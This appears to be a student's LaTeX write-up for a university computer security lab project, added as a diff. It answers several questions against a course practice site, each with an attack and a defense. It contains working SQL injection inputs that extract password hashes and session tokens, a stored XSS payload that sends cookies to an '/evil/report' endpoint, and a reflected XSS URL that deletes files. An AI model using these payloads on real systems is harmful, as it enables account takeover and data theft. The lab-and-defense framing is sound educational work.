@@ -1,0 +1,143 @@
+\documentclass[11pt]{article}
+\usepackage{lastpage, fancyhdr,color, graphicx,latexsym,multirow}
+\pagestyle{empty}
+\usepackage[T1]{fontenc}
+\setlength\voffset{-1in}
+\setlength\hoffset{-1in}
+\setlength\topmargin{3cm}
+\setlength\oddsidemargin{2.5cm}
+\setlength\textheight{8in}
+\setlength\textwidth{6.51in}\setlength\footskip{1in}
+\setlength\headheight{12pt}
+\setlength\headsep{0.06in}
+\usepackage{setspace}
+\usepackage{epstopdf,sectsty}
+\usepackage{relsize}
+\usepackage{pgf, float}
+\usepackage{url}
+\usepackage{csquotes}
+\usepackage{graphicx, caption}
+\usepackage{scrextend}
+\usepackage{amssymb}
+\usepackage[T1]{fontenc}
+\usepackage{upquote}
+
+\definecolor{light-gray}{gray}{0.55}
+
+\renewcommand{\thefootnote}{\alph{footnote}}
+
+\begin{document}
+\pagestyle{fancy}
+   \lhead{}\rhead{}
+   \lfoot{\textcolor{light-gray}{\small dannyallover}}
+        \cfoot{{\thepage}}
+        \rfoot{}
+  \renewcommand{\headrulewidth}{0pt}
+
+
+\newpage
+\phantom{22}
+\vspace{-3cm}
+
+\begin{center}
+
+\begin{figure}[hbt!]
+    \centering
+    \includegraphics[width=100px]{meliodas.png}
+    \caption*{dannyallover}
+\end{figure}
+
+
+\bigskip
+{\fontsize{30}{10}\selectfont 
+\bigskip
+
+
+\bigskip
+\medskip
+{ \textbf{CS 161 P3 \\}}
+{ \textbf{\huge Danny Halawi \\}}}
+
+\medskip
+{ \textbf{\Large November 2020}}
+\bigskip
+
+\end{center}
+
+
+\bigskip
+
+\bigskip
+
+
+\thispagestyle{empty}
+
+
+\begin{center}
+\medskip
+{\LARGE \textbf{Professor:\ \textit{Nick Weaver}}}
+
+\bigskip
+
+\begin{center}
+{\LARGE \textbf{special thanks to TA:\ \\ \medskip \textit{Evan Corriere} \& \textit{Peyrin Kao}}}
+\end{center}
+
+\bigskip
+
+\end{center}
+
+\linespread{1.5}
+
+\newpage\setlength{\parskip}{1mm}
+\onehalfspacing
+\bigskip
+\setcounter{page}{1}
+
+\begin{center}
+{\LARGE \bf System Design}
+\end{center}
+\sffamily
+\noindent
+{\textbf{Question 3:}} \\
+\textbf{attack:} We conjecture that when a user signs up, there is a SQL query made in the back-end to check if the user exists (or for some other purpose).\ Furthermore, we conjecture that the statement takes on the following form:\ SELECT (something) FROM users\footnote{since we know the table is called users (given in the question)} WHERE username = \textcolor{red}{\textbf{input1}} AND password = \textcolor{blue}{\textbf{input2}}; we perform a SQL injection:
+\begin{itemize}
+    \item[$\star$] username:\ \textcolor{magenta}{garbage{\textquotesingle}; SELECT md5\_hash FROM users WHERE username = {\textquotesingle}shomil{\textquotesingle} -{}-}
+    \item[$\star$] password:\ \textcolor{magenta}{garbage}
+\end{itemize}
+\noindent   
+\textbf{defense:} We should use prepared statements (parameterized query).\ Doing so will cause the input to be interpreted as a literal value and placed correctly in the syntax tree, instead of being concatenated in the command-string.\ \\
+\\
+\sffamily
+\noindent
+{\textbf{Question 4:}} \\
+\textbf{attack:} Through question 3, we know that the sign-up page runs SQL in the back-end, so we can utilize this to nullify the statement made by the back-end and inject our own SQL to query whatever DB we desire (in this case the sessions table\footnote{since we know the table is called sessions (given in the question)}); we provide the following input:
+\begin{itemize}
+    \item[$\star$] username:\ \textcolor{magenta}{garbage{\textquotesingle}; SELECT token FROM sessions WHERE username={\textquotesingle}nicholas{\textquotesingle} -{}-}
+    \item[$\star$] password:\ \textcolor{magenta}{garbage}
+\end{itemize}
+We therefore retrieve the value of his token, log-in into our account, locate our session-token cookie, and replace the value with nicholas' token; refreshing the page will then complete the exploit.\ \textbf{defense:} We should use prepared statements (parameterized query).\ Doing so will cause the input to be interpreted as a literal value and placed correctly in the syntax tree, instead of being concatenated in the command-string.\ \\
+\\
+\sffamily
+\noindent
+{\textbf{Question 5:}} \\
+\textbf{attack:} We perform a stored XSS attack.\ We create a file, \textcolor{magenta}{garbage.txt}, fill it with \textcolor{magenta}{garbage}, and upload it.\ We then change the name of the file to be \textcolor{magenta}{<script>fetch({\textquotesingle}/evil/report?message={\textquotesingle}+document.cookie)</script>}, and share that file with cs161.\ Because we are told that he is actively browsing the main pages of the site, and because we are told that his session-token cookie is sent to the server with every request, this javascript will run once he loads a page that displays the title of the file and send his session-cookie to /evil/logs accordingly.\ \textbf{defense:} Because the filename is appearing in some HTML tag when it is displayed to the user, we need to sanitize our input.\ Our data sanitization could remove all tags, or could be more intentional and remove specific (potentially malicious) tags like <script>.\ \\
+\\
+\sffamily
+\noindent
+{\textbf{Question 6:}} \\
+\textbf{attack:} We perform a reflected XSS attack.\ When you search for a file, the query-parameter is reflected back in the search results.\ We therefore inject a script to delete the files by placing the script as a query-parameter in the URL for file search:\ \textcolor{magenta}{https://proj3.cs161.org/site/search?term=<script>fetch({\textquotesingle}https://\\proj3.cs161.org/site/deleteFiles{\textquotesingle},\{method:{\textquotesingle}POST{\textquotesingle}\})</script>}.\ Logging into the UnicornBox website and entering the URL there (because of the CORS policy) completes the attack.\ \textbf{defense:} We could not have our query parameter be placed into the HTML.\ However, if this functionality is needed, we can enforce Content Security Policy and provide an allowlist of sources of trusted content.\ Additionally, we can specify policy directives and enable control over the resources that page is allowed to load.\ \\
+\\
+\sffamily
+\noindent
+{\textbf{Question 7:}} \\
+We are told that people reuse passwords and that admin has a normal user account.\ We revisit the sign-up page and get their password for their normal user account by performing the following SQL injection:
+\begin{itemize}
+    \item[$\star$] username:\ \textcolor{magenta}{garbage{\textquotesingle}; SELECT md5\_hash FROM users WHERE username = {\textquotesingle}admin{\textquotesingle} -{}-}
+    \item[$\star$] password:\ \textcolor{magenta}{garbage}
+\end{itemize}
+\noindent
+We retrieve the password hash, so the next natural step is to decode their password using a md5\_hash decoder\footnote{I used this decoder:\ https://www.md5online.org/md5-decrypt.html}, which yields the password \textcolor{magenta}{letmein}.\ We then click the admin button on the login page and enter the password to complete the attack.\ \textbf{defense:} We should mandate that the admin always use a different password than their user account password.\ More generally, we should use prepared statements (parameterized query).\ Doing so will cause the input to be interpreted as a literal value and placed correctly in the syntax tree, instead of being concatenated in the command-string.\
+
+
+\end{document}
